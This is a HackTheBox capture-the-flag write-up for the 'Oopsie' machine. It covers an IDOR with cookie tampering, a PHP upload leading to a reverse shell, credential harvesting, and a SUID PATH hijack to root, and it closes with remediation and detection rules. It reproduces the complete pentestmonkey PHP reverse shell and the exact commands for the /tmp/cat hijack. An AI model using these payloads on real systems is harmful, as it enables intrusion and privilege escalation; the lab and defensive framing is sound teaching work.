# Oopsie - Broken Access Control (IDOR), Arbitrary File Upload, and SUID PATH Hijacking

**Platform:** HackTheBox | **Target OS:** Linux (Ubuntu 18.04) | **Difficulty:** Easy  
**Focus:** Insecure Direct Object References (IDOR), Cookie Manipulation, Unrestricted File Upload, SUID Binary Exploitation (`bugtracker`), Environment PATH Hijacking

---

## 1. Executive Summary & Attack Chain

During the technical penetration test of the target host **Oopsie** (`10.129.111.118`), an end-to-end multi-vector compromise was executed. The engagement followed a black-box testing methodology against the target's exposed perimeter.

The tactical intrusion progressed across three core milestones:
1. **Reconnaissance & Endpoint Discovery:** Active TCP mapping revealed standard HTTP (Port 80) and SSH (Port 22). Passive source code inspection of the web application unveiled a hidden script path leading to an administrative authentication portal at `/cdn-cgi/login/`.
2. **Access Control Bypass & Web Shell Delivery:** Authenticating as an unprivileged guest user exposed an account lookup mechanism vulnerable to **Insecure Direct Object Reference (IDOR)** (`id=1`). Querying the administrative record yielded the administrative user's ID (`34322`) and role (`admin`). Replaying these attributes via client-side cookie tampering granted access to a privileged `/uploads` portal. An unvalidated PHP reverse shell was uploaded and triggered, establishing an initial low-privilege interactive foothold (`www-data`).
3. **Internal Pivoting & SUID PATH Exploitation:** Local directory enumeration within `/var/www/html/cdn-cgi/login/db.php` exposed hardcoded database credentials (`robert:M3g4C0rpUs3r!`), facilitating lateral movement to local user `robert` via SSH. System auditing identified a custom SUID root binary, `/usr/bin/bugtracker`, which executed the utility `cat` via an unqualified relative path. Manipulating the process's `$PATH` variable hijacked execution flow to a custom payload, granting immediate, unconstrained `root` administrative access (UID 0).

### Attack Kill-Chain Diagram
```text
[ HTTP Recon & Source Inspection ] ─> Discovered Admin Portal (/cdn-cgi/login/)
               │
               ▼
[ IDOR Parameter Tampering ] ───────> Extracted Admin Session Cookie: 'user=34322', 'role=admin'
               │
               ▼
[ Unrestricted File Upload ] ───────> Uploaded 'php-reverse-shell.php' -> Executed via Web Root
               │
               ▼
[ Initial Foothold (www-data) ] ────> Read 'db.php' -> Harvested Credentials (robert:M3g4C0rpUs3r!)
               │
               ▼
[ Lateral Movement via SSH ] ───────> Interactive Shell as User: robert (UID 1000)
               │
               ▼
[ SUID PATH Hijacking (/tmp/cat) ] ─> Executed '/usr/bin/bugtracker' -> Root Shell (UID 0)
```

---

## 2. Network Reconnaissance & Surface Mapping

### Nmap Service Scan
A non-intrusive TCP port scan was performed to profile open ports and running application versions:

```bash
❯ nmap -sV -sC 10.129.111.118
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-12 04:11 +0300
Nmap scan report for 10.129.111.118
Host is up (0.29s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.46 seconds
```

### Directory Enumeration
Active web path fuzzing was conducted using `gobuster`:

```bash
❯ gobuster dir -u http://10.129.111.118 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.111.118
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 279]
.hta.html            (Status: 403) [Size: 279]
.hta.php             (Status: 403) [Size: 279]
.hta.txt             (Status: 403) [Size: 279]
.htaccess            (Status: 403) [Size: 279]
.htaccess.html       (Status: 403) [Size: 279]
.htaccess.php        (Status: 403) [Size: 279]
.htpasswd            (Status: 403) [Size: 279]
.htpasswd.php        (Status: 403) [Size: 279]
.htpasswd.txt        (Status: 403) [Size: 279]
.htpasswd.html       (Status: 403) [Size: 279]
.htaccess.txt        (Status: 403) [Size: 279]
css                  (Status: 301) [Size: 314] [--> http://10.129.111.118/css/]
fonts                (Status: 301) [Size: 316] [--> http://10.129.111.118/fonts/]
images               (Status: 301) [Size: 317] [--> http://10.129.111.118/images/]
index.php            (Status: 200) [Size: 10932]
index.php            (Status: 200) [Size: 10932]
js                   (Status: 301) [Size: 313] [--> http://10.129.111.118/js/]
server-status        (Status: 403) [Size: 279]
themes               (Status: 301) [Size: 317] [--> http://10.129.111.118/themes/]
uploads              (Status: 301) [Size: 318] [--> http://10.129.111.118/uploads/]
Progress: 19004 / 19004 (100.00%)
===============================================================
Finished
==============================================================
```

Manual analysis of the root page source via `curl` revealed an unlinked JavaScript reference disclosing the administrative routing path:

```html
//# sourceURL=pen.js
    </script>
<script src="/cdn-cgi/login/script.js"></script>
<script src="/js/index.js"></script>
</body>
</html>
```

---

## 3. Initial Access & Broken Access Control (IDOR)

### Mechanics of the Vulnerability
The application implemented a flawed, stateless authorization mechanism based entirely on untrusted client-side data:
1. **Insecure Direct Object Reference (IDOR):** The endpoint `/cdn-cgi/login/admin.php?content=accounts&id=X` fetches user profile attributes directly from the database using the URL parameter `id` without verifying whether the requesting user's session owns or is authorized to view that record.
2. **Predictable Session / Role Cookie Verification:** Rather than maintaining server-side session persistence (such as cryptographic session tokens verified against internal states), the backend directly inspects user-controlled HTTP request cookies:
   $$\text{Access Allowed} \iff \text{Cookie}(\texttt{role}) = \text{"admin"} \land \text{Cookie}(\texttt{user}) = \text{"34322"}$$

### Exploitation & Authentication Tampering
Logging into `/cdn-cgi/login/` via the available guest option yielded an account management URL:
```text
http://10.129.111.118/cdn-cgi/login/admin.php?content=accounts&id=2
```
Modifying the parameter to `id=1` exposed the super-administrator profile, disclosing the administrative user ID (`34322`) and role.

By modifying the active browser cookies to reflect the administrator context:
- `role=admin`
- `user=34322`

A subsequent request to `/cdn-cgi/login/admin.php` unlocked the restricted **Uploads** functionality.

### Web Shell Execution Mechanics
A standard PHP reverse shell payload was uploaded to `/uploads/`:

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
```

*Under the Hood:*
- The script establishes a raw socket connection to the attacker's listener via `fsockopen($ip, $port)`.
- It invokes `proc_open()` to spawn `/bin/sh -i`, binding its three standard POSIX I/O descriptors (`0: STDIN`, `1: STDOUT`, `2: STDERR`) to independent inter-process pipes.
- A continuous polling loop via `stream_select()` acts as an I/O multiplexer, bridging TCP network byte-streams directly into the spawned shell's STDIN, and redirecting shell STDOUT/STDERR back down the socket.

Executing the shell through an HTTP GET request triggered the callback on port 443:

```bash
❯ sudo nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.111.118 46862
Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 01:50:25 up 41 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls
bin
boot
cdrom
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
$ cd root
/bin/sh: 2: cd: can't cd to root
$ cd home
$ ls
robert
$ cd robert
$ ls
user.txt
$ cat user.txt
f2c74ee8db7983851ab2a96a44eb7981
```

The user flag was recovered: `f2c74ee8db7983851ab2a96a44eb7981`.

---

## 4. Lateral Movement & Internal Credential Harvesting

Inspecting backend application files under `/var/www/html/cdn-cgi/login/` revealed hardcoded database credentials:

```bash
$ pwn
/bin/sh: 8: pwn: not found
$ whoami
www-data
$ cd ..
$ ls
robert
$ cd ..
$ ls
bin
boot
cdrom
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
$ cd /var/www
$ ls
html
$ cd html
$ ls
cdn-cgi
css
fonts
images
index.php
js
themes
uploads
$ cd cdn-cgi/login
$ ls
admin.php
db.php
index.php
script.js
$ cat db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
$ 
```

The discovered password `M3g4C0rpUs3r!` was tested against the system user `robert` via SSH:

```bash
❯ ssh robert@10.129.111.118
The authenticity of host '10.129.111.118 (10.129.111.118)' can't be established.
ED25519 key fingerprint is: SHA256:IzSXDs9dqcYA25jc85qIroMg43bjBJ8DEbPHmAEr8Nc
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.111.118' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
robert@10.129.111.118's password:
Permission denied, please try again.
robert@10.129.111.118's password:
Permission denied, please try again.
robert@10.129.111.118's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Sep 12 02:03:03 UTC 2026

  System load:  0.0               Processes:             115
  Usage of /:   40.6% of 6.76GB   Users logged in:       0
  Memory usage: 9%                IP address for ens160: 10.129.111.118
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

275 packages can be updated.
222 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sat Jan 25 10:20:16 2020 from 172.16.118.129
robert@oopsie:~$ ls
user.txt
robert@oopsie:~$ sudo -l
[sudo] password for robert:
Sorry, try again.
[sudo] password for robert:
Sorry, user robert may not run sudo on oopsie.
robert@oopsie:~$ sudo -l
[sudo] password for robert:
Sorry, user robert may not run sudo on oopsie.
robert@oopsie:~$ id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

Auditing user context revealed secondary membership in group `bugtracker` (GID 1001).

---

## 5. Privilege Escalation & OS Mechanics (SUID PATH Hijacking)

### System Binary Audit
A sweep for SUID binaries across the root filesystem revealed an anomalous executable:

```bash
robert@oopsie:~$ find / -perm -4000 -type f 2>/dev/null
/snap/core/11420/bin/mount
/snap/core/11420/bin/ping
/snap/core/11420/bin/ping6
/snap/core/11420/bin/su
/snap/core/11420/bin/umount
/snap/core/11420/usr/bin/chfn
/snap/core/11420/usr/bin/chsh
/snap/core/11420/usr/bin/gpasswd
/snap/core/11420/usr/bin/newgrp
/snap/core/11420/usr/bin/passwd
/snap/core/11420/usr/bin/sudo
/snap/core/11420/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/11420/usr/lib/openssh/ssh-keysign
/snap/core/11420/usr/lib/snapd/snap-confine
/snap/core/11420/usr/sbin/pppd
/snap/core/11743/bin/mount
/snap/core/11743/bin/ping
/snap/core/11743/bin/ping6
/snap/core/11743/bin/su
/snap/core/11743/bin/umount
/snap/core/11743/usr/bin/chfn
/snap/core/11743/usr/bin/chsh
/snap/core/11743/usr/bin/gpasswd
/snap/core/11743/usr/bin/newgrp
/snap/core/11743/usr/bin/passwd
/snap/core/11743/usr/bin/sudo
/snap/core/11743/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/11743/usr/lib/openssh/ssh-keysign
/snap/core/11743/usr/lib/snapd/snap-confine
/snap/core/11743/usr/sbin/pppd
/bin/fusermount
/bin/umount
/bin/mount
/bin/ping
/bin/su
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/newuidmap
/usr/bin/passwd
/usr/bin/at
/usr/bin/bugtracker
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/newgidmap
/usr/bin/gpasswd
/usr/bin/sudo
```

The binary `/usr/bin/bugtracker` is owned by `root:bugtracker` with the SUID bit set (`-rwsr-xr-x`).

---

### Theoretical Mechanics: Unqualified Binary Invocations & PATH Resolution
1. **The Role of the SUID Bit:**
   When an executable with the `setuid` bit is invoked, the Linux kernel sets the **Effective User ID (EUID)** of the resulting process to that of the file's owner (`root` / UID 0), while maintaining the **Real User ID (RUID)** of the calling user (`robert` / UID 1000).
2. **The Unqualified Executable Flaw:**
   When the program logic within `bugtracker` requests file reading functionality, it issues a call such as:
   ```c
   system("cat /path/to/bug/report");
   ```
   The C library function `system()` passes this command string directly to the POSIX subshell `/bin/sh -c`.
3. **Environment Lookup Order:**
   Because `cat` is an **unqualified relative command** (lacking an absolute path prefix like `/bin/cat`), the executing shell resolves the location of `cat` by iterating sequentially through the colon-delimited directories defined in the user's `$PATH` environment variable:
   $$\text{Lookup Sequence: } \text{dir}_1 \to \text{dir}_2 \to \dots \to \text{dir}_n$$
4. **Environment Manipulation:**
   By prepending a writable directory (e.g., `/tmp`) to `$PATH`:
   ```bash
   export PATH=/tmp:$PATH
   ```
   The shell inspects `/tmp` prior to standard system paths (`/bin`, `/usr/bin`). A rogue executable named `cat` placed in `/tmp` intercepts execution. Because `system()` does not sanitize the inherited environment, the crafted payload executes under the parent process's elevated `EUID=0` context without dropping capabilities.

---

### Exploitation & Host Takeover

```bash
robert@oopsie:~$ cd /tmb
-bash: cd: /tmb: No such file or directory
robert@oopsie:~$ cd /tmp
robert@oopsie:/tmp$ echo -e '#!/bin/bash\n/bin/sh' > cat
robert@oopsie:/tmp$ chmod +x cat
robert@oopsie:/tmp$ export PATH=/tmp:$PATH
robert@oopsie:/tmp$ /usr/bin/bugtracker somefile

------------------
: EV Bug Tracker :
------------------

Provide Bug ID:
^C
robert@oopsie:/tmp$ /usr/bin/bugtracker somefile

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 123
---------------

# whoami
root
# cd /root
# ls
reports  root.txt
# cat root.txt
# ls
reports  root.txt
# head root.txt
af13b0bee69f8a877c3faf667f7beacf
```

Root shell execution was confirmed, and the administrative proof flag was acquired: `af13b0bee69f8a877c3faf667f7beacf`.

---

## 6. Defensive Remediation & Detection Engineering

### Remediation Strategies

| Vulnerability / Finding | Severity | Technical Remediation |
| :--- | :--- | :--- |
| **SUID Path Traversal / Relative Invocation** | **Critical** | In the source of `/usr/bin/bugtracker`, specify absolute binary paths (`/bin/cat`) rather than relying on unqualified relative invocations. Alternatively, replace `system()` calls with `execve()` while explicitly wiping the environment (`execve(..., NULL)`). Remove the SUID bit if elevated execution is unnecessary. |
| **Insecure Direct Object Reference (IDOR)** | **High** | Implement strict session-based authorization controls. Every account request must validate that the requested `id` corresponds directly to the identity of the authenticated user recorded in the server-side session. |
| **Unrestricted File Upload** | **High** | Enforce MIME-type verification, extension whitelisting (prohibit executable extensions like `.php`, `.phtml`), and store uploaded artifacts in directories configured with execution disabled (`NoExec`, or non-PHP handlers). |
| **Hardcoded Cleartext Credentials** | **Medium** | Remove plaintext database credentials from web code (`db.php`). Store credentials in environment variables or utilize secret-management vaults with restricted file system permissions. |

---

### Detection Engineering

#### 1. Auditd Monitoring (Detecting Execution of Modified PATH Binaries via SUID)
Configure Linux Auditd to detect execution of binaries located inside world-writable directories such as `/tmp` when invoked by privileged processes:

```text
-a always,exit -F arch=b64 -F dir=/tmp -F perm=x -F euid=0 -k suspicious_tmp_exec
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/bugtracker -k suid_bugtracker_audit
```

#### 2. Sigma Rule (Suspicious Shell Spawned by Bugtracker with Altered PATH)
```yaml
title: Privileged Shell Spawned from SUID Bugtracker via Hijacked PATH
id: e4b23821-698d-4f81-9bc1-20963e9f4512
status: experimental
description: Detects the execution of an interactive shell spawned from the custom SUID binary bugtracker or executing out of /tmp under root privileges.
logsource:
  category: process_creation
  product: linux
detection:
  selection_parent:
    ParentImage|endswith: '/usr/bin/bugtracker'
    Image|endswith:
      - '/bin/sh'
      - '/bin/bash'
    User: 'root'
  selection_tmp:
    ParentImage|endswith: '/usr/bin/bugtracker'
    Image|startswith: '/tmp/'
  condition: selection_parent or selection_tmp
falsepositives:
  - None expected for this custom binary.
level: critical
tags:
  - attack.privilege_escalation
  - attack.t1574.007
  - attack.t1548.001
```
